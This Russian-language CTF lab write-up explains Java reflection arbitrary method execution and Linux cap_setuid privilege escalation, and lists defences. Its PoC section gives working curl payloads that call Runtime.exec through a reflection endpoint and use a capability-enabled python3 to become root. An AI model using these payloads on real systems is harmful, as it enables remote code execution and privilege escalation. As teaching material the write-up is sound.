# Reflection AME & Linux Capabilities


## 1. Описание уязвимостей

### **Java Arbitrary Method Execution (AME)**
Уязвимость возникает в архитектурах, использующих «динамическую диспетчеризацию» через **Java Reflection API**. Разработчики часто создают универсальные обработчики, которые принимают имя класса и метода извне для гибкости системы.
**Причина:** Отсутствие валидации имен классов по «белому списку». Атакующий может вызвать методы стандартных библиотек (например, `java.lang.Runtime`), что превращает гибкий API в точку удаленного выполнения произвольного кода (RCE).

### **Linux Capabilities (cap_setuid)**
В современных дистрибутивах Linux права доступа дробятся на **Capabilities**. Привилегия `cap_setuid` позволяет процессу устанавливать произвольный UID (в том числе `0` — root).
**Причина:** Ошибочное назначение данной привилегии интерпретаторам (Python, Bash) или отладочным утилитам. В отличие от SUID-бита, Capabilities менее заметны при стандартном аудите, но позволяют мгновенно поднять привилегии до уровня суперпользователя.


## 2. Способы защиты

**Для Java:** * Использование **Security Manager** для ограничения доступа рефлексии к критическим классам.
  Валидация имен классов и методов по строгому белому списку (**Allow-list**).
  Использование современных библиотек внедрения зависимостей вместо самописных механизмов на рефлексии.

**Для Linux:** * Регулярный аудит привилегий командой `getcap -r /`.
  Использование механизма **AppArmor** или **SELinux**.
  Соблюдение принципа наименьших привилегий.

## 4. Описание уязвимости в приложении

Приложение представлено в виде веб-интерфейса **DevOps Diagnostic Panel**, который позволяет получать информацию о системе (версия Java, тип ОС).

При нажатии на кнопку «Run Check» фронтенд приложения отправляет фоновый `fetch` запрос к скрытому эндпоинту `/api/v1/execute`, явно передавая системный класс для вызова рефлексии. Например:
`/api/v1/execute?class=java.lang.System&method=getProperty&arg=os.name`

Проанализировав исходный код страницы или сетевые запросы, атакующий может понять структуру API. Заменив класс `java.lang.System` на `java.lang.Runtime`, а метод на `exec`, он получает возможность выполнить любую системную команду от имени `appuser`.

После получения первичного доступа атакующий обнаружит в директории `/opt/sys-tools/` бинарный файл `python3`, обладающий `cap_setuid+ep`.


## 5. POC (эксплоит)

### **Шаг 1: User Flag (RCE через AME)**

Проанализировав фронтенд, отправляем модифицированный запрос через `curl` для чтения флага:

```bash
curl -G "http://localhost:8080/api/v1/execute" \
     --data-urlencode "class=java.lang.Runtime" \
     --data-urlencode "method=exec" \
     --data-urlencode "arg=cat /home/appuser/user.txt"

```

**Флаг:** `practice{java_reflection_rce}`

### **Шаг 2: Root Flag (PrivEsc через Capabilities)**

Используем обнаруженный бинарник Python для смены UID на `0` (root) и чтения защищенного файла:

```bash
curl -G "http://localhost:8080/api/v1/execute" \
     --data-urlencode "class=java.lang.Runtime" \
     --data-urlencode "method=exec" \
     --data-urlencode "arg=/opt/sys-tools/python3 -c __import__('os').setuid(0);print(open('/root/root.txt').read())"

```

**Флаг:** `practice{linux_capabilities_abuse}`
